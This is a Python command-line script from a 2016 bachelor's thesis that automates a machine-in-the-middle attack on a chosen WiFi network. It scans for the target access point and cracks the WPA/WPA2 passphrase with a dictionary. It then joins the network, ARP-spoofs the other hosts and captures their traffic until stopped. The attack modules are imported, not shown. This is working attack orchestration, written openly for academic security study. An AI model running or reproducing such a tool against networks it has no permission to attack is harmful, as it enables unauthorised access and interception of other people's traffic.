#!/usr/bin/env python3
"""
WiFi Machine-in-the-Middle - command line interface

Automatization of MitM Attack on WiFi Networks
Bachelor's Thesis UIFS FIT VUT
Martin Vondracek
2016
"""

import argparse
import logging
import sys
import tempfile
import time
import warnings
from enum import Enum, unique
from typing import Optional, Sequence

import coloredlogs

import access
from access import WirelessUnlocker, WirelessConnecter
from capture import Dumpcap
from common import WirelessScanner
from model import WirelessInterface
from requirements import Requirements, RequirementError, UidRequirement
from topology import ArpSpoofing
from wpa2 import PassphraseNotInDictionaryError

with open('VERSION') as version_file:
    __version__ = version_file.read().strip()

__author__ = 'Martin Vondracek'
__email__ = 'xvondr20@stud.fit.vutbr.cz'

logger = logging.getLogger(__name__)


@unique
class ExitCode(Enum):
    """
    Return codes.
    Some are inspired by sysexits.h.
    """
    EX_OK = 0
    """successful termination"""

    ARGUMENTS = 2
    """incorrect or missing program arguments"""

    EX_UNAVAILABLE = 69
    """required program or file does not exist"""

    EX_NOPERM = 77
    """permission denied"""

    TARGET_AP_NOT_FOUND = 79
    """target AP was not found during scan"""

    PASSPHRASE_NOT_IN_DICTIONARY = 80
    """WPA/WPA2 passphrase was not found in available dictionary/dictionaries"""


def main():
    logging.captureWarnings(True)
    warnings.simplefilter('always', ResourceWarning)

    config = Config()
    config.parse_args()
    if config.logging_level:
        coloredlogs.install(level=config.logging_level)
    # else:
    #    TODO(xvondr20): disable logger
    logger.info('config parsed from args')
    logger.debug(str(config))

    logger.info('check all requirements')
    try:
        Requirements.check_all()
    except RequirementError as e:
        if isinstance(e.requirement, UidRequirement):
            exitcode = ExitCode.EX_NOPERM
        else:
            exitcode = ExitCode.EX_UNAVAILABLE
        print(e.requirement.msg, file=sys.stderr)
        print('Requirements check failed. Error logged, exiting. ({})'.format(exitcode.name))
        return exitcode.value

    print(config.PROGRAM_DESCRIPTION)

    interface = config.interface

    with tempfile.TemporaryDirectory() as tmp_dirname:
        interface.start_monitor_mode()

        scanner = WirelessScanner(tmp_dir=tmp_dirname, interface=interface.name)
        print('scan')
        scan = scanner.scan_once()

        interface.stop_monitor_mode()

        target = None
        for ap in scan:
            if ap.essid == config.essid:
                target = ap
                print('target found ' + target.essid)
                logger.info('target found ' + target.essid)
                break

        if target:
            interface.start_monitor_mode(target.channel)
            wireless_unlocker = WirelessUnlocker(ap=target, if_mon=interface.name)
            try:
                wireless_unlocker.start()
            except PassphraseNotInDictionaryError:
                interface.stop_monitor_mode()
                print('Passphrase not in dictionary.', file=sys.stderr)
                return ExitCode.PASSPHRASE_NOT_IN_DICTIONARY.value

            interface.stop_monitor_mode()

            wireless_connecter = WirelessConnecter(interface=interface.name)
            wireless_connecter.connect(target)

            arp_spoofing = ArpSpoofing(interface=interface)
            arp_spoofing.start()
            print('Running until KeyboardInterrupt.')
            try:
                with Dumpcap(interface=interface) as dumpcap:
                    while True:
                        arp_spoofing.update_state()
                        dumpcap.update()
                        time.sleep(1)

            except KeyboardInterrupt:
                print('stopping')
            arp_spoofing.stop()
            arp_spoofing.clean()
            wireless_connecter.disconnect()
        else:
            print('target AP not found', file=sys.stderr)
            logger.error('target AP not found')
            return ExitCode.TARGET_AP_NOT_FOUND.value

    return ExitCode.EX_OK.value


class Config:
    PROGRAM_NAME = 'wifimitmcli'
    PROGRAM_DESCRIPTION = 'WiFi Machine-in-the-Middle - command line interface'
    LOGGING_LEVELS_DICT = {'debug': logging.DEBUG,
                           'warning': logging.WARNING,
                           'info': logging.INFO,
                           'error': logging.ERROR,
                           'critical': logging.ERROR,
                           'disabled': None,  # logging disabled
                           }
    LOGGING_LEVEL_DEFAULT = 'disabled'

    def __init__(self):
        self.logging_level = None
        self.essid = None
        # TODO(xvondr20) Implement BSSID arg self.target_bssid = None
        self.interface = None

        self.parser = self.init_parser()

    def __str__(self):
        return '<{} logging_level={}, essid={}, interface={!s}>'.format(
            type(self).__name__, logging.getLevelName(self.logging_level), self.essid, self.interface)

    @staticmethod
    def parser_type_wireless_interface(arg: str) -> WirelessInterface:
        """
        Parsers' interface argument conversion and checking.
        :type arg: str
        :param arg: interface argument
        :rtype: WirelessInterface

        Raises:
            argparse.ArgumentTypeError If given name is not a valid interface name.
        """
        try:
            i = WirelessInterface(arg)
        except ValueError:
            raise argparse.ArgumentTypeError('{} is not a valid interface name'.format(arg))
        else:
            return i

    @classmethod
    def init_parser(cls) -> argparse.ArgumentParser:
        """
        Initialize argument parser.
        :rtype: argparse.ArgumentParser
        :return: initialized parser
        """
        parser = argparse.ArgumentParser(
            prog=cls.PROGRAM_NAME,
            description=cls.PROGRAM_DESCRIPTION,
            epilog="Automatization of MitM Attack on WiFi Networks, Bachelor's Thesis, UIFS FIT VUT,"
                   " Martin Vondracek, 2016."
        )
        parser.add_argument('-v', '--version', action='version', version='%(prog)s {}'.format(__version__))
        parser.add_argument('-ll', '--logging-level',
                            # NOTE: The type is called before check against choices. In order to display logging level
                            # names as choices, name to level int value conversion cannot be done here. Conversion is
                            # done after parser call in `self.parse_args`.
                            default=cls.LOGGING_LEVEL_DEFAULT,
                            choices=cls.LOGGING_LEVELS_DICT,
                            help='select logging level (default: %(default)s)'
                            )

        target_ap = parser.add_argument_group(title='Target AP')
        target_ap.add_argument('essid',
                               help='essid of network for attack'),
        parser.add_argument('interface',
                            type=cls.parser_type_wireless_interface,
                            help='wireless network interface for attack'
                            )
        return parser

    def parse_args(self, args: Optional[Sequence[str]] = None):
        """
        Parse command line arguments and store checked and converted values in self.
        `"By default, the argument strings are taken from sys.argv"
            <https://docs.python.org/3/library/argparse.html#argparse.ArgumentParser.parse_args>`_
        :type args: Optional[Sequence[str]]
        :param args: argument strings
        """
        # NOTE: Call to parse_args with namespace=self does not set logging_level with default value, if argument is not
        # in provided args, for some reason.
        parsed_args = self.parser.parse_args(args=args)

        # Check if provided interface name is recognized as wireless interface name.
        for i in access.list_wifi_interfaces():
            if i.name == parsed_args.interface.name:
                break
        else:
            self.parser.error('argument interface: {} is not recognized as a valid wireless interface'.format(
                    parsed_args.interface.name)
            )

        # name to value conversion as noted in `self.init_parser`
        self.logging_level = self.LOGGING_LEVELS_DICT[parsed_args.logging_level]
        self.essid = parsed_args.essid
        self.interface = parsed_args.interface


if __name__ == '__main__':
    status = main()
    sys.exit(status)